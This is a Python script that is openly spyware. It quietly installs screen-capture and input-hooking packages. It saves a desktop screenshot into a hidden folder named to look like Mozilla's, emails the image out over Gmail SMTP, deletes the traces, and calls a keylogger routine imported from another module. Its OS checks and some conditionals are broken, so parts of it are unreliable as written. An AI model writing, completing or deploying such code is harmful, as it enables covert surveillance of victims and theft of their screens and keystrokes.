#!/usr/bin/python3

#notes: make it where it can tell what OS it is using.
#libraries
import os,platform, subprocess, sys, time, requests, smtplib, shutil
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from keylogger_sub import keystrokes

#generic email stuff
email_user = 'email@gmail.com'
email_password = 'password'
email_send = 'email@gmail.com'
subject = 'subject'

msg = MIMEMultipart()
msg['From'] = email_user
msg['To'] = email_send
msg['Subject'] = subject

# install packages
def installSoft():
    if platform.system() == "win32" or platform.system() == "Linux" or platform.system() == "darwin": 
        if os.system('pip3 show autopy') == "autopy" and os.system('pip3 show pynput') == "pynput" and os.system('pip3 show logging') == "logging":
            pass
        else:
            os.system('pip3 -q install autopy pynput logging --user; ')
    else:
        print("Not a valid OS")
        quit() 
#functions

def screenshotsLinux():
    # taking the screenshot
    import autopy, pynput
    if print(os.path.isdir("/tmp/.mozilla")) == True:
        pass
    else:
        os.mkdir('/tmp/.mozilla')

    be = autopy.bitmap.capture_screen()
    be.save("/tmp/.mozilla/ss.png")

    # sending the screenshot
    body = 'This is the screenshot of the Desktop!'
    msg.attach(MIMEText(body,'plain'))

    filename='/tmp/.mozilla/ss.png'
    attachment  =open(filename,'rb')

    part = MIMEBase('application','octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition',"attachment; filename= "+filename)

    msg.attach(part)
    text = msg.as_string()
    server = smtplib.SMTP('smtp.gmail.com',587)
    server.starttls()
    server.login(email_user,email_password)


    server.sendmail(email_user,email_send,text)
    server.quit()

    # deletes screenshot
    os.remove('/tmp/.mozilla/ss.png')

def screenshotsWin():
    import autopy, pynput
    os.mkdir(r'C:\tmp\mozilla')
    b = autopy.bitmap.capture_screen()
    b.save(r"C:\tmp\mozilla\ss.png")

#checks what OS it is
def OScheck():
    if platform.system() == "win32":
        installSoft() 
        screenshotsWin()
        keystrokes()
    elif platform.system() == "darwin":
        installSoft()
        import autopy, pynput 
        screenshotsLinux()
        keystrokes() 
    elif platform.system() == "Linux":
        installSoft() 
        screenshotsLinux()
        keystrokes()
        shutil.rmtree('/tmp/.mozilla')
    else:
        print("Not a valid OS")
        quit()
OScheck()
